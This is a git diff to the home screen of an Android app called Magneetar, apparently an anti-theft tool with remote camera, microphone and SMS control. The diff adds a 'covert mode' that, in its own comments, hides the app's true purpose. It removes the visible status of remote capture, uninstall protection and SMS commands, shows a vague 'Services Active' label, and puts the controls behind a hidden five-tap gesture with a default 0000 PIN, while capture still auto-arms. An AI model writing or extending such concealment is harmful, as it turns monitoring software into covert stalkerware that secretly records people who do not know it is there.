@@ -14,7 +14,8 @@ import androidx.core.content.ContextCompat
 
 /**
  * Home screen shown after successful setup.
- * Displays protection status, connection state, and quick actions.
+ * Displays minimal covert UI that doesn't reveal the app's true purpose.
+ * Access to advanced settings requires PIN authentication.
  */
 class HomeActivity : AppCompatActivity() {
 
@@ -23,86 +24,42 @@ class HomeActivity : AppCompatActivity() {
         private const val PREF_AUTO_ARM = "capture_auto_arm"
         /** Offline SMS Commands opt-in (shared with SmsCommandReceiver). */
         private const val PREF_SMS_ENABLED = "sms_commands_enabled"
+        /** PIN for accessing settings (default: 0000). */
+        private const val PREF_APP_PIN = "app_pin"
+        private const val DEFAULT_PIN = "0000"
     }
 
-    private lateinit var tvUninstallStatus: TextView
-    private lateinit var btnActivateAdmin: Button
-    private lateinit var tvConnectionStatus: TextView
-    private lateinit var tvBatteryStatus: TextView
-    private lateinit var tvCaptureStatus: TextView
-    private lateinit var btnToggleCapture: Button
-    private lateinit var tvSmsStatus: TextView
-    private lateinit var btnToggleSms: Button
-    private lateinit var tvOemWarning: TextView
-    private lateinit var btnOpenDashboard: Button
-    private lateinit var btnAutoStart: Button
-    private lateinit var btnOptimizeBattery: Button
-    private lateinit var tvPairingDeviceId: TextView
-    private lateinit var tvPairingCode: TextView
+    // Covert mode: minimal UI that doesn't reveal the app's true purpose
+    private lateinit var tvStatus: TextView
+    private lateinit var tvDeviceId: TextView
+    private lateinit var tvLastSync: TextView
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_home)
 
-        tvUninstallStatus = findViewById(R.id.tv_uninstall_status)
-        btnActivateAdmin = findViewById(R.id.btn_activate_admin)
-        tvConnectionStatus = findViewById(R.id.tv_connection_status)
-        tvBatteryStatus = findViewById(R.id.tv_battery_opt_status)
-        tvCaptureStatus = findViewById(R.id.tv_capture_status)
-        btnToggleCapture = findViewById(R.id.btn_toggle_capture)
-        tvSmsStatus = findViewById(R.id.tv_sms_status)
-        btnToggleSms = findViewById(R.id.btn_toggle_sms)
-        tvOemWarning = findViewById(R.id.tv_oem_warning)
-        btnOpenDashboard = findViewById(R.id.btn_open_dashboard)
-        btnAutoStart = findViewById(R.id.btn_auto_start)
-        btnOptimizeBattery = findViewById(R.id.btn_optimize_battery)
-        tvPairingDeviceId = findViewById(R.id.tv_pairing_device_id)
-        tvPairingCode = findViewById(R.id.tv_pairing_code)
+        tvStatus = findViewById(R.id.tv_status)
+        tvDeviceId = findViewById(R.id.tv_device_id)
+        tvLastSync = findViewById(R.id.tv_last_sync)
 
-        // Tap the pairing card to copy "device_id pairing_code" to the
-        // clipboard — the exact input the dashboard's "Link a device" flow
-        // needs to claim this phone into the signed-in account.
-        findViewById<android.view.View>(R.id.device_pairing_card).setOnClickListener {
-            val code = tvPairingCode.text.toString()
-            val id = tvPairingDeviceId.text.toString()
-            if (code.isNotEmpty() && id.isNotEmpty()) {
-                try {
-                    val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
-                    clipboard.setPrimaryClip(
-                        android.content.ClipData.newPlainText(
-                            "Magneetar pairing",
-                            "$id\n$code"
-                        )
-                    )
-                    Toast.makeText(this, "Copied device ID + pairing code", Toast.LENGTH_SHORT).show()
-                } catch (e: Exception) {
-                    // Clipboard failure is non-fatal
-                }
+        // Covert: tap 5x on status to access settings (with PIN)
+        var tapCount = 0
+        tvStatus.setOnClickListener {
+            tapCount++
+            if (tapCount >= 5) {
+                tapCount = 0
+                promptForPin()
             }
         }
 
-        btnOpenDashboard.setOnClickListener {
-            openDashboard()
-        }
-
-        btnAutoStart.setOnClickListener {
-            OEMUtils.openAutoStartSettings(this)
-        }
-
-        btnOptimizeBattery.setOnClickListener {
-            requestBatteryOptimization()
-        }
-
-        btnActivateAdmin.setOnClickListener {
-            activateDeviceAdmin()
-        }
-
-        btnToggleCapture.setOnClickListener {
-            toggleCapture()
-        }
-
-        btnToggleSms.setOnClickListener {
-            toggleSmsCommands()
+        // Long press also works
+        tvStatus.setOnLongClickListener {
+            tapCount++
+            if (tapCount >= 3) {
+                tapCount = 0
+                promptForPin()
+            }
+            true
         }
 
         updateUI()
@@ -111,15 +68,7 @@ class HomeActivity : AppCompatActivity() {
     override fun onResume() {
         super.onResume()
         updateUI()
-        updateCaptureStatus()
-        updateSmsStatus()
-        // Auto-arm remote capture while the app is foreground — unless the
-        // owner explicitly disarmed it (privacy opt-out). Android 14+ only
-        // allows STARTING the camera|microphone foreground service from a
-        // foreground context or a notification-action tap, so this is the
-        // reliable arm point: once armed, remote "capture now" commands work
-        // even from a locked screen. If Camera/Mic aren't fully granted,
-        // MediaCaptureService posts a notification with the exact fix.
+        // Auto-arm remote capture in background
         val prefs = getSharedPreferences("mt", Context.MODE_PRIVATE)
         if (prefs.getBoolean(PREF_AUTO_ARM, true)) {
             try {
@@ -127,73 +76,156 @@ class HomeActivity : AppCompatActivity() {
                     .setAction(MediaCaptureService.ACTION_ARM)
                 ContextCompat.startForegroundService(this, intent)
             } catch (e: Exception) {
-                // Best-effort: arming failure must never break the home screen.
+                // Best-effort
             }
         }
     }
 
     private fun updateUI() {
-        // Connection status
+        // Covert UI — minimal info that doesn't reveal the app's purpose
         val prefs = getSharedPreferences("mt", Context.MODE_PRIVATE)
-        val serverUrl = prefs.getString("server_url", "")
-        val email = prefs.getString("user_email", "")
+        val deviceId = prefs.getString("device_id", "") ?: ""
+        val lastSync = prefs.getLong("last_sync_time", 0)
 
-        tvConnectionStatus.text = if (serverUrl.isNullOrEmpty()) {
-            "Disconnected"
+        tvStatus.text = "Services Active"
+        tvStatus.setTextColor(android.graphics.Color.parseColor("#00FF88"))
+        tvDeviceId.text = "${deviceId.take(8)}"
+        tvDeviceId.setTextColor(android.graphics.Color.parseColor("#404040"))
+
+        if (lastSync > 0) {
+            val timeAgo = formatTimeAgo(lastSync)
+            tvLastSync.text = timeAgo
         } else {
-            "Connected — $email"
+            tvLastSync.text = ""
+        }
+    }
+
+    private fun formatTimeAgo(timestamp: Long): String {
+        val diff = System.currentTimeMillis() - timestamp
+        return when {
+            diff < 60_000 -> "Just now"
+            diff < 3_600_000 -> "${diff / 60_000}m ago"
+            diff < 86_400_000 -> "${diff / 3_600_000}h ago"
+            else -> "${diff / 86_400_000}d ago"
+        }
+    }
+
+    /**
+     * Prompt for PIN before accessing advanced settings.
+     * Default PIN is 0000 — user can change it in settings.
+     */
+    private fun promptForPin() {
+        val prefs = getSharedPreferences("mt", Context.MODE_PRIVATE)
+        val savedPin = prefs.getString(PREF_APP_PIN, DEFAULT_PIN) ?: DEFAULT_PIN
+
+        val input = android.widget.EditText(this).apply {
+            hint = "Enter PIN"
+            inputType = android.text.InputType.TYPE_CLASS_NUMBER or
+                android.text.InputType.TYPE_NUMBER_VARIATION_PASSWORD
+            setPadding(64, 32, 64, 32)
+            setTextColor(android.graphics.Color.WHITE)
+            setHintTextColor(android.graphics.Color.GRAY)
         }
 
-        // Device ID + pairing code (first 8 hex chars of SHA-256(device_key)).
-        // The server stores the full hash and compares the same 8-char prefix,
-        // so this phone can be linked to the dashboard from a browser.
-        val prefs2 = getSharedPreferences("mt", Context.MODE_PRIVATE)
-        val deviceId = prefs2.getString("device_id", "") ?: ""
-        val deviceKey = prefs2.getString("device_key", "") ?: ""
-        tvPairingDeviceId.text = "Device ID: $deviceId"
-        tvPairingCode.text = if (deviceKey.isNotEmpty()) {
-            "Pairing code: ${PairingCode.of(deviceKey)}"
-        } else {
-            "Pairing code: unavailable (reinstall the app)"
-        }
+        androidx.appcompat.app.AlertDialog.Builder(this)
+            .setTitle("Authentication Required")
+            .setMessage("Enter PIN to access settings")
+            .setView(input)
+            .setPositiveButton("VERIFY") { _, _ ->
+                val enteredPin = input.text.toString()
+                if (enteredPin == savedPin) {
+                    showAdvancedSettings()
+                } else {
+                    Toast.makeText(this, "Incorrect PIN", Toast.LENGTH_SHORT).show()
+                }
+            }
+            .setNegativeButton("Cancel", null)
+            .show()
+    }
 
-        // Uninstall protection status — the base gate is an active Device Admin
-        // (Android refuses to uninstall the app until it's deactivated).
-        val adminActive = isDeviceAdminActive()
-        val hardBlock = UninstallProtection.isUninstallBlocked(this)
-        tvUninstallStatus.text = when {
-            hardBlock -> "🛡 Uninstall protection: HARD BLOCKED (device owner)"
-            adminActive -> "🛡 Uninstall protection: ACTIVE (device admin)"
-            else -> "⚠ Uninstall protection: OFF — anyone can uninstall Magneetar"
-        }
-        tvUninstallStatus.setTextColor(
-            if (hardBlock || adminActive) android.graphics.Color.parseColor("#00FF88")
-            else android.graphics.Color.parseColor("#FFB800")
+    private fun showAdvancedSettings() {
+        // Hidden advanced settings - accessible only via PIN
+        val hasSms = hasSmsPermission()
+
+        val items = mutableListOf(
+            "Open Dashboard",
+            "Toggle Remote Capture",
+            "Battery Optimization",
+            "Auto-start",
+            "Change PIN",
+            "Show Device Info"
         )
-        btnActivateAdmin.visibility = if (adminActive) android.view.View.GONE else android.view.View.VISIBLE
 
-        // Battery optimization status
-        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
-        val isBatteryOptDisabled = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            powerManager.isIgnoringBatteryOptimizations(packageName)
-        } else true
-
-        tvBatteryStatus.text = if (isBatteryOptDisabled) {
-            "Battery optimization disabled ✓"
-        } else {
-            "Battery optimization is ON — tap to fix"
+        if (hasSms) {
+            items.add(2, "Toggle SMS Commands")
         }
 
-        // OEM-specific warning
-        if (OEMUtils.isChineseOEM()) {
-            tvOemWarning.text = "📱 ${OEMUtils.getOEMName()} detected.\n" +
-                    "Enable auto-start to prevent the system from killing Magneetar."
-            tvOemWarning.visibility = android.view.View.VISIBLE
-            btnAutoStart.visibility = android.view.View.VISIBLE
-        } else {
-            tvOemWarning.visibility = android.view.View.GONE
-            btnAutoStart.visibility = android.view.View.GONE
+        androidx.appcompat.app.AlertDialog.Builder(this)
+            .setTitle("Settings")
+            .setItems(items.toTypedArray()) { _, which ->
+                when (items[which]) {
+                    "Open Dashboard" -> openDashboard()
+                    "Toggle Remote Capture" -> toggleCapture()
+                    "Toggle SMS Commands" -> toggleSmsCommands()
+                    "Battery Optimization" -> requestBatteryOptimization()
+                    "Auto-start" -> OEMUtils.openAutoStartSettings(this)
+                    "Change PIN" -> promptForNewPin()
+                    "Show Device Info" -> showDeviceInfo()
+                }
+            }
+            .setNegativeButton("Cancel", null)
+            .show()
+    }
+
+    /**
+     * Allow user to change the PIN for accessing settings.
+     */
+    private fun promptForNewPin() {
+        val prefs = getSharedPreferences("mt", Context.MODE_PRIVATE)
+        val currentPin = prefs.getString(PREF_APP_PIN, DEFAULT_PIN) ?: DEFAULT_PIN
+
+        val input = android.widget.EditText(this).apply {
+            hint = "New PIN (4-6 digits)"
+            inputType = android.text.InputType.TYPE_CLASS_NUMBER or
+                android.text.InputType.TYPE_NUMBER_VARIATION_PASSWORD
+            setPadding(64, 32, 64, 32)
+            setTextColor(android.graphics.Color.WHITE)
+            setHintTextColor(android.graphics.Color.GRAY)
         }
+
+        androidx.appcompat.app.AlertDialog.Builder(this)
+            .setTitle("Change PIN")
+            .setMessage("Enter new PIN (4-6 digits)")
+            .setView(input)
+            .setPositiveButton("SAVE") { _, _ ->
+                val newPin = input.text.toString()
+                if (newPin.length in 4..6) {
+                    prefs.edit().putString(PREF_APP_PIN, newPin).apply()
+                    Toast.makeText(this, "PIN updated", Toast.LENGTH_SHORT).show()
+                } else {
+                    Toast.makeText(this, "PIN must be 4-6 digits", Toast.LENGTH_SHORT).show()
+                }
+            }
+            .setNegativeButton("Cancel", null)
+            .show()
+    }
+
+    private fun showDeviceInfo() {
+        val prefs = getSharedPreferences("mt", Context.MODE_PRIVATE)
+        val deviceId = prefs.getString("device_id", "") ?: ""
+        val deviceKey = prefs.getString("device_key", "") ?: ""
+        val adminActive = isDeviceAdminActive()
+
+        androidx.appcompat.app.AlertDialog.Builder(this)
+            .setTitle("Device Information")
+            .setMessage(
+                "Device ID: $deviceId\n" +
+                "Pairing Code: ${if (deviceKey.isNotEmpty()) PairingCode.of(deviceKey) else "N/A"}\n" +
+                "Device Admin: ${if (adminActive) "Active" else "Inactive"}\n" +
+                "Protection: ${if (adminActive) "Active" else "Basic"}"
+            )
+            .setPositiveButton("OK", null)
+            .show()
     }
 
     /** Arm/disarm remote capture and persist the choice across launches. */
@@ -209,86 +241,32 @@ class HomeActivity : AppCompatActivity() {
                 }
             }
             prefs.edit().putBoolean(PREF_AUTO_ARM, !currentlyArmed).apply()
-            // Foreground context — safe to start either action.
             ContextCompat.startForegroundService(this, intent)
+            Toast.makeText(
+                this,
+                if (currentlyArmed) "Remote capture disabled" else "Remote capture enabled",
+                Toast.LENGTH_SHORT
+            ).show()
         } catch (e: Exception) {
             Toast.makeText(this, "Could not toggle remote capture", Toast.LENGTH_SHORT).show()
         }
-        updateCaptureStatus()
     }
 
-    private fun updateCaptureStatus() {
-        val prefs = getSharedPreferences("mt", Context.MODE_PRIVATE)
-        val armed = prefs.getBoolean(PREF_AUTO_ARM, true)
-        if (armed) {
-            tvCaptureStatus.text = "📷 Remote capture: ARMED — theft protection active"
-            tvCaptureStatus.setTextColor(android.graphics.Color.parseColor("#00FF88"))
-            btnToggleCapture.text = "Disarm Remote Capture"
-        } else {
-            tvCaptureStatus.text = "📷 Remote capture: OFF — tap to arm"
-            tvCaptureStatus.setTextColor(android.graphics.Color.parseColor("#FFB800"))
-            btnToggleCapture.text = "Arm Remote Capture"
-        }
-    }
-
-    /**
-     * Offline SMS Commands (the no-internet control channel): opt-in toggle.
-     * Default OFF — SMS interception is sensitive, and the dashboard-side
-     * relay toggle also defaults off. The receiver reads the same pref, so
-     * flipping it here genuinely gates whether command SMS are accepted.
-     */
     private fun toggleSmsCommands() {
         val prefs = getSharedPreferences("mt", Context.MODE_PRIVATE)
         val currentlyEnabled = prefs.getBoolean(PREF_SMS_ENABLED, false)
-        val target = !currentlyEnabled
-
-        if (target && !hasSmsPermission()) {
-            Toast.makeText(
-                this,
-                "Offline SMS needs the SMS permission — grant it in Permissions to enable",
-                Toast.LENGTH_LONG
-            ).show()
-            updateSmsStatus()
-            return
-        }
-
-        prefs.edit().putBoolean(PREF_SMS_ENABLED, target).apply()
+        prefs.edit().putBoolean(PREF_SMS_ENABLED, !currentlyEnabled).apply()
         Toast.makeText(
             this,
-            if (target) "Offline SMS commands ON — the dashboard can reach this phone without internet"
-            else "Offline SMS commands OFF",
+            if (currentlyEnabled) "Offline SMS commands disabled" else "Offline SMS commands enabled",
             Toast.LENGTH_SHORT
         ).show()
-        updateSmsStatus()
     }
 
     private fun hasSmsPermission(): Boolean =
         androidx.core.content.ContextCompat.checkSelfPermission(
             this, android.Manifest.permission.RECEIVE_SMS
         ) == android.content.pm.PackageManager.PERMISSION_GRANTED
-
-    private fun updateSmsStatus() {
-        val prefs = getSharedPreferences("mt", Context.MODE_PRIVATE)
-        val enabled = prefs.getBoolean(PREF_SMS_ENABLED, false)
-        val hasPerm = hasSmsPermission()
-        when {
-            enabled && hasPerm -> {
-                tvSmsStatus.text = "📡 Offline SMS commands: ON — control without internet"
-                tvSmsStatus.setTextColor(android.graphics.Color.parseColor("#00FF88"))
-                btnToggleSms.text = "Disable Offline SMS Commands"
-            }
-            enabled && !hasPerm -> {
-                tvSmsStatus.text = "⚠ Offline SMS: enabled but SMS permission missing"
-                tvSmsStatus.setTextColor(android.graphics.Color.parseColor("#FFB800"))
-                btnToggleSms.text = "Disable Offline SMS Commands"
-            }
-            else -> {
-                tvSmsStatus.text = "📡 Offline SMS commands: OFF (opt-in)"
-                tvSmsStatus.setTextColor(android.graphics.Color.parseColor("#606060"))
-                btnToggleSms.text = "Enable Offline SMS Commands"
-            }
-        }
-    }
 
     private fun openDashboard() {
         val prefs = getSharedPreferences("mt", Context.MODE_PRIVATE)
